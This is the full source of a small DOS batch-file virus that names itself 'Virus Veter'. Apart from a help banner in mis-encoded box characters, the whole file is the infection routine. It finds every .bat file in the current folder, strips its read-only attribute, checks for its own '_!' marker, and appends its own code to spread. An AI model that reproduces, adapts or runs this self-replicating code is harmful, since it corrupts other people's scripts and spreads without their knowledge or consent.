@echo off%_Veter%
set q=nul
goto MasterBlock
:Message
echo 浜様様様様様様様様様様様様様�
echo � Virus Veter... Be well!   �
echo � This is Small Batch Virus �
echo 藩様様様様様様様様様様様様様�
goto :!!
:MasterBlock
if "%1"=="/?" goto message
if "%0"=="" goto !!
:!! [Silly virus for batch files]
@for %%q in (*.bat) do set _!=%%q > %q%
@for %%b in (*.bat) do call attrib %%b -r > %q%
@for %%a in (*.bat) do find "_!" %%a > %q%
@if not errorLevel 1 goto ! > %q%
@type %0 >> %_!%
@goto !!
:!
